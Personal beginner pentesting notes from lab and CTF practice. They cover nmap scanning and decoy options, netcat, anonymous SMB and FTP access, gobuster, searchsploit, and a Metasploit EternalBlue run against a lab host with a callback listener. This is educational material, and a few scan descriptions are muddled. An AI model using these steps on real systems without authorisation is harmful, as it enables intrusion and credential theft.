# **Welcome**

Welcome to a A journey into CyberSec 🚗 🧳: the Cybersecurity Starter's Treasure Trove!

Dive into a curated collection of knowledge, gleaned from learning platforms, CTF challenges, and personal exploration.

# **Walkthrough**

Google is your friend! GOOGLE EVERYTHING! Even if it seems stupid... just Google it

<strong>I - is it alive?</strong>

Ping target to make sure you can reach it.

<strong>II - Scan server</strong>

With nmap, scan server:
 `nmap <IP-ADDRESS>`

Then do a a full port scan in the background while you look at what the quick scan yield `sudo nmap <IP ADD> -p- sV` (👈🏾 less stealthy)

💡 <i>Output result in a file, better for reporting/note taking </i>

<strong> III - Banner grabbing </strong>

this will be helpful later to look for vulnerabilities for specific service versions.

See `nc` and other tools like `whatweb` , `nmap` or `curl` for banner grabbing.

💡 <i>so far I have observed that although you can get banner at a specific port with ncI havent yet figured out a way to do the same with whatweb</i>

<strong> IV - Add default scripts to server scan</strong>

add the `-sC` option to the nmap command to run default scripts.

`nmap -sC -p <port>,<port> -oA nibbles_script_scan <IP ADDRESS>`

💡 <i>notice how you can limit the script to only a couple ports? THIS IS USEFUL WHEN YOU DONT WANT TO MAKE TOO MUCH NOISE AND WHEN YOU ALREADY KNOW THESES ARE THE ONLY PORTS RUNNING</i>


The goal of the previous 3 steps is to get more info about the server and service running; get version and then research exploits about it!. Then you can google or searchsploit the items found…

<strong>V - Directory Enumeration </strong>

Now let's attempt to discover and list the files and directories within a web server's file system.

* Check <strong>Robots.txt file (if exists)</strong>
* Ffuf
* goBuster


# **NMAP**

## **what is it for?**

- Audit the security aspects of networks
- Simulate penetration tests
- Check firewall and IDS settings and configurations
- Types of possible connections
- Network mapping
- Response analysis
- Identify open ports
- Vulnerability assessment as well.

ALWAYS STORE EVERY SINGLE SCAN - so that you can later use it for comparison, documentation and reporting

**basic command**

**1 -** `nmap <IP ADDRESS>`

***No option specified, will scan the 1000 most common ports by default.***

```
port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine.
port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows.</i>
```

**building on the basic command:**

**2-** `nmap -sV --open -oA result-file <TARGET-IP>`

***This scan will scan open ports and provide info about service such as versions and service name, then output result in result-file***

```
- `-open`: This option instructs `nmap` to only show hosts that have at least one open (responsive) port. In other words, it filters out hosts that are completely unresponsive or do not have any open ports.
- `oA`: This option specifies the output format and file naming for the scan results. The `oA` flag is followed by a filename prefix, which will be used to generate three different output files:
    - `filename.nmap`: This file contains human-readable output in a text format.
    - `filename.gnmap`: This is a grepable output format that can be used with tools like `grep` or scripting languages.
    - `filename.xml`: This is an XML output format which can be used for further analysis or parsing by other tools.
```

**3-** `nmap -p- --open -oA result-file 10.129.42.190`

***This will check for **any services running on non-standard ports** that our initial can may have missed. Since this scans all 65,535 TCP ports (because of -p-), it can take a long time to finish depending on the network. It will output the result into result-file***

## **Nmap output**

💡 ***Similarly, output options will follow the format: `-oX`  (where X is the output type.  **N** is normal output: **.nmap** extension, **G** is grepable output with **.gnmap** extension, **X** is XML output with **.xml** extension)***

ALSO we can covert to a more readable output like so:

`xsltproc target.xml -o target.html`

Here an example of converting nmap out into an HTML page:

1 - run the scan: `sudo nmap <IP-ADDRESS> -p- -oX <file-name>`  *filename only, dont add an extension

2 - convert it to html: `xsltproc <filename> -o <filename>.html`

3 - See the result 😃

## **Nmap scans**

💡 ***as a rule of thumb, the scaning options mostly follow the format: `-sX` (where X is usually the first char in a scan name Example: -sA ACK scan and -sS SYN scan)***

**`-Sc`** specify that nmap script should be used to try and obtain more detailed info.

**`-sV`** Performs a version scan. Will display service protocol, app name and version.

**`-p-`** we want to scan ALL 65 535 ports.

**`-D`**  Decoy scanning. Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent.

***Example: `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5`***
***generate random (`RND`) a specific number (for example: `5`) of IP addresses separated by a colon (`:`). Our real IP address is then randomly placed between the generated IP addresses***

**`-sU`** UDP scan. Can be combined to a TCP scan type like SYN (-sS)

**`-sY`** **SCTP INIT** scan. SCTP INIT scan is the SCTP equivalent of a TCP SYN scan.

**`-F`** scan top 100 ports

**`-sn`**  disables port scanning. Instead of doing an ARP ping (3 way handshack with SYN, ACK, etc), it does an ICMP Echo requests (ping, ttl)

**`-sA`** **TCP ACK** Scan. It is used to map out
firewall rulesets, determining whether they are stateful or not and
which ports are filtered. (BETTER TO USE TO EVADE FIREWALL?)

***see example of use:***
***`sudo nmap <TARGET> -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace` and look at SENT and RCVD info.***

**`-sS`**  TCP **SYN** scan. (send SYN, wait for response: Either SYN/ACK to signify it s open or RST for non listener)

***Specify that we want to do an ARP ping (as opposed to option above). This is typically the default option when nothing is specified.***

**`-sT`**  TCP **Connect**  scan. Default when TCP SYN scan is not an option.

**`-PE`** performs the ping scan by using ICMP Echo requests

**`-Pn`**   deactivate the ICMP echo requests

**`--packet-trace`**  shows all packets sent and received

**`--reason`**  displays the reason for the specific result

**`-n`** disable DNS resolution

**`-sV`** get additional available information from the open ports. identify versions, service names, and details about our target.

**`--disable-arp-ping`**  disable ARP ping  (see example of command `sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping`)

**`-oA something`** store the result in a file in all fomat starting with the name ‘something’

**`-iL`** Performs defined scans against targets in provided ‘list_of_hosts.list’ file (notice the extension of the file)

**`--top-ports=10`** Scans the specified top ports that have been defined as most frequent. (21, 22, 23, 25, 80, 110, 139, 443, 445, 3389)

**`-sT`** connect scan ******************************(More stealthy)******************************. uses the TCP three-way handshake to determine if a specific port on a target host is open or closed. The scan sends an `SYN` packet to the target port and waits for a response. It is considered open if the target port responds with an `SYN-ACK` packet and closed if it responds with an `RST` packet

**`--max-retries`** set # time nmap should try reaching a port

**`--stats-every=5s`**defining how periods of time the status should be shown

**`-v`** increase verbosity level: display more info

**`-vv`** max verbosity level LOL

**`-A`** Aggressive scanning.** Nmap will gather as much info as possible, combining multiple scan types and scripts into one command.

***example: `nmap -A -p445 10.129.42.253` (notice we have specified a port here; port 445!! )***

***will yield:***
***- service & version***
***- OS Detection***
***- Script Scaning* (will run a set of default scans from the nmap scripting engine NSE)***
***- traceroute & path disc* to help identify routers and devices along the path***

Example of output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

**`--initial-rtt-timeout 50ms`**  Sets the specified time value as initial RTT timeout

**`--max-rtt-timeout 100ms`**

## **Nmap scripts**

**1 - CMD to run Default script:**

`sudo nmap <IP-ADD> -sC`

**2 - Run 1 specific script:**

with category only

`sudo nmap <target> --script <category>`

with script name

`nmap --script <script name> -p<port> <host>`

**3 - run multiple scripts with script name:**

`sudo nmap <target> --script <script-name>,<script-name>,...`

**4 - Grab the banner (fingerprinting a service):**

`nmap -sV --script=banner -p<port> <host>`

***💡 This can also be done with **NetCat** Like so: `nc -nv <target ip> <port>`***


**useful scripts**

**[http-enum](https://nmap.org/nsedoc/scripts/http-enum.html):** can be used to enumerate common web application directories

`nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <IP-ADDRESS>`

Example output:

```
**Eli90@htb[/htb]$** nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
|_http-server-header: Apache/<REDACTED> (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
```

💡 ***The output above is  an example of a useless result so if you get this, move on.***


**`banner`** To get the banner obviously

**`smtp-commands`** shows which commands we can use by interacting with the target smtp

**`vuln`**  find out vulnerabilities (THIS IS A SCRIPT CATEGORY) - more info here https://nmap.org/book/host-discovery-strategies.html



## Port Statuses

| State | Description |
| --- | --- |
| open | This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. |
| closed | When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |
| filtered | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.  (Error type 3, code 0,1,2,3,9,10,13) |
| unfiltered | This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. |
| open/filtered | If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |
| closed/filtered | This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |

# **NETCAT**

## What is it

abbreviated as "nc", the "Swiss Army knife" of networking tools due to its wide range of capabilities. it can accomplish the following:

* Network Connectivity: Establish TCP and UDP connections to remote hosts.
* Port Scanning:  determine which ports on a remote host are open and responsive.
* Banner Grabbing: retrieve banners and information from services running on open ports.
* File Transfer: transfer files between systems over a network connection.
* Reverse Shells: In cybersecurity assessments, Netcat can be used to create reverse shells.
* Proxying and Port Forwarding: Netcat can act as a proxy server or perform port forwarding.
* Chat Server: It can also function as a basic chat server

## Banner grabbing**

`nc -nv 10.129.42.190 **22**`  (where ******22****** is the port!)

Breaking down the command:

- `nc`: This is the command to invoke the `netcat` tool, which is a versatile networking utility for reading from and writing to network connections.
- `nv`: These are options passed to `nc`:
    - `n`: Disables DNS resolution, preventing `nc` from attempting to resolve the IP address to a hostname.
    - `v`: Enables verbose mode, which displays more information about the connection process.
- `10.129.42.190`: This is the IP address of the target host that you want to establish a connection with.
- `22`: This is the port number you want to connect to. In this case, it's port `22`, which is typically used for SSH connections.

# FTP

## What is it

Stands for **File Transfer Protocol**!
You will usually see it display in a **nmap** scan like this:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

## Connect via FTP

Connect with the command:

`ftp -p <target IP>`

you terminal should go from **$** to **ftp>**

then enumerate content:

`ls` and `cd` to enter the older

**Download a file with the command** `get <file>`

end with

`exit`

# **SMB**

## What is it

stands for **Sever Message Block**

- allows users and administrators to share folders and make them accessible remotely by other users
- Prevalent vector in windows machines
- Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as **[EternalBlue](https://www.avast.com/c-eternalblue)**

💡 ***NMAP has a script to enumerate samba!!!***


see below:

`nmap --script smb-os-discovery.nse -p<port> <target-IP>`

output of example `nmap --script smb-os-discovery.nse -p445 10.10.10.40` will be:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

You can see that the host runs **Windows 7**  under  **OS**

❗️**You can perform an aggressive scan with nmap against this particular service to find out more:**

Like this (wit param -A)

`nmap -A -p445 10.129.42.253`   - See Example of outpu in Nmap page.

## Exploit

**1 - Shares**

💡 **smbclient**

The goal of the exploit is to **Enumerate** & **interact** with **SMB shares**

**enumerate (LIST SMB Shares):**

`smbclient -N -L \\\\<target-IP>`

**-N** suppresses the password prompt.

**-L** specifies that we want to retrieve a list of available shares on the remote host

Example of output:

```
Eli90@htb[/htb]$ smbclient -N -L \\\\10.129.42.253
    Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers	users           Disk
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))SMB1 disabled -- no workgroup available
```

Everything with **$** (For example print$ or IPC$) are **default shares.**

We are interested in **Non Default Shares** (In this case users)

**Interact (CONNECT):**

`smbclient \\\\<Target-IP>\\<non default share>`

attempt to log in without password and do as a **guest** then `ls` as per below. If denied, then you will need a user and passord:

```
Eli90@htb[/htb]$ smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password:
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

if you have credentials log in like this:

`smbclient -U <user name> \\\\<target-Ip>\\users`

the `cd` and `ls` away. See an output example:

```
Eli90@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\usersEnter WORKGROUP\bob's password:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available

smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available

smb: \bob\> get passwords.txt
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

as for FTP, download file with `get`

`get <file.txt>`

# **GoBuster**

## What is it

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing


💡 ***you can enumerate files and DIRECTORIES with gobuster!***

## GoBuster command

`gobuster dir -u <**http://**target-ip> -w <wordlist-path>`

**dir** enumerate DIECTORIES as mentioned.

`gobuster dns -d <target-domain.com> -w <wordlist-path>`

**dns + d** signify we are interested to see subdomains.

- For each generated subdomain, the tool sends DNS queries to the DNS server to check if the subdomain exists and maps to an IP address.
- If a subdomain is found to exist, the tool lists it as a result of the enumeration

example of output below:

```
Eli90@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
2020/12/17 23:10:34 Finished
===============================================================
```

# **cURL**

## What is it

`cURL`, which stands for **"Client URL,"**  is a command-line tool and library for transferring data with URLs (Uniform Resource Locators).


💡***Also another thing I realized you get litterally get the code of a page with curl `curl http://<IP-ADDRESS>`***

It is widely used to interact with various internet protocols such as HTTP, HTTPS, FTP, FTPS, SCP, SFTP, LDAP, and more.

With `cURL`, you can send and receive data to and from servers using various protocols.

## Banner Grabbing with cURL

`curl -IL https://<domain-name.com>`

where:

- `I`: This flag tells `curl` to send an HTTP HEAD request. The HEAD method is similar to GET, but it only requests the headers of the response, not the actual content. This is useful when you want to retrieve metadata about a resource (such as its size, content type, etc.) without actually downloading the full content.
- `L`: This flag tells `curl` to follow any redirects. If the server responds with a redirection (HTTP status code 3xx), `curl` will automatically follow the redirect and show the headers of the final response.

example output:

```
Eli90@htb[/htb]$ curl -IL https://www.inlanefreight.comHTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

# **EYEWITNESS**

## What is it:

EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.

EyeWitness is designed to run on **Kali** Linux. It will auto detect the file you give it with the -f flag as either being a text file with URLs on each new line, nmap xml output, or nessus xml output. The --timeout flag is completely optional, and lets you provide the max time to wait when trying to render and screenshot a web page.

See [github repo](https://github.com/RedSiege/EyeWitness)

# **Whatweb**

## what is it:

Helps extract the **version** of web servers, supporting **frameworks**, and **applications** using the command-line tool

## Basic command:

`whatweb <target-ip>`

Example output:

```
Eli90@htb[/htb]$ whatweb --no-errors 10.10.10.0/24http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]

```

# **Searchsploit**

## What is it:

is a command-line tool that is part of the Exploit Database (EDB) project

we can use to search for public vulnerabilities/exploits for any application.

once installed, type command:


## Basic command:

`searchsploit <application name>`

example of output:

```
Eli90@htb[/htb]$ searchsploit openssh 7.2
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```

the output above means:

- **OpenSSH 2.3 < 7.7 - Username Enumeration**
    - Path: `linux/remote/45233.py`
    - Description: This exploit is related to username enumeration in OpenSSH versions 2.3 to 7.7. It likely allows an attacker to determine valid usernames on a remote system.

    and the **path** info provided on the right refers to the location of the exploit or vulnerability description within the Exploit Database (EDB) repository:

    `linux/remote/45233.py`: This path indicates that the exploit
     script is located in the "linux" directory, under the "remote"
    subdirectory, and the filename is "45233.py". This is a Python script
    targeting a remote vulnerability.

# **METASPLOIT FRAMEWORK  (MF)**


## What is it:

An excellent tool for Pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.

Advantages of the MF:

* Running reconnaissance scripts to enumerate remote hosts and compromised targets

* Verification scripts to test the existence of a vulnerability without actually compromising the target

* Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

* Many post-exploitation and pivoting tools


## Basic Command

To run the metasploit, we can use the **msfconsole** command like so:

`msfconsole`

then when it’s up and running search:

`search exploit eternalblue`  where **eternalblue** is the name of an exploit.

Example of output:

```
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

The output above shows that we found one exploit (**exploit/windows/smb/ms17_010_psexec**)

to use the exploit found, run:

`use exploit/windows/smb/ms17_010_psexec`

## configure your attack

then you will have to ensure **all the required options are SET.**

in our example, two options require to be set: **RHOSTS** and **RPORT**

see below, they are empty:

```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

you can set them with the `set`  command, where RHOSTS is the **IP of our target**  and RPORT standing for **Remote Port** specifies the port number that the Metasploit module will use to communicate with the target system over the network.

💡 ***per Chatgpt it should be set to **445** as this is the port where SMB service is typically run***


```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

As you see above HTB also set**LHOST**  to **tun0.** This was probably required but not visible in the output before cause it was cut off.

**LHOST** is LOCAL HOST (Attacker’s machine); in this case, "tun0" likely refers to a network interface associated with a tunneled connection, such as a VPN or a network tunnel.

**tun0**: "tun0" is likely the name of a network interface
that represents a tunneling device. Tunnels are often used to create
secure, encrypted connections over an untrusted network, such as the
internet. In this scenario, "tun0" could represent a VPN connection or
another form of tunnel.


💡 ***By setting the `LHOST` option to the attacker's IP address***
***associated with the "tun0" interface, the Metasploit framework is***
***configured to listen for a connection back from the exploited target***
***through the specified tunnel. Once the target system is successfully***
***compromised and exploited, it will establish a connection to the***
***attacker's machine through the defined tunnel and IP address.***

## Start attack

Before starting you can check to ensure that **server is vulnerable** with

`check`

output:

```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```


💡 ***Note that not every exploit in the `Metasploit Framework` supports the `check` function.***

then finally start the attack with

`run` or  `exploit`  !!

## Remeber this:

- Pay attention to details:

what are you searching for? could be

`search <application name>` OR  `search <service-name>`  (Remember in HTB web exploit, you found the right vuln by searching **simple backup** and NOT **wordpress** so search all kinds of stuff.

- It s good to set **RHOSTS** and **RPORT** but it VERY IMPORTANT to also double check the other params that may have already been set.

For ex in HTB web exploit chall, the exploit had FILEPATH as default /**etc/passords** but the file you wanted was actually at **/flag.txt** (As specified in the excercie description) so again pay attention frien 🙂
